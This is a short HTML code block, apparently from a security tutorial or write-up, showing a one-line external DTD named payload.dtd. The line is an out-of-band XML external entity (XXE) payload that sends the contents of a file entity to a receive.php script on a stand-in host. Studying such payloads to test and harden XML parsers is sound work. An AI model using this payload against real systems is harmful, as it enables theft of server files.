<figure class="highlight plaintext"><figcaption><span>http://example.com/payload.dtd</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote_send &quot;&lt;!ENTITY send SYSTEM &#x27;http://example.com/receive.php?data=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
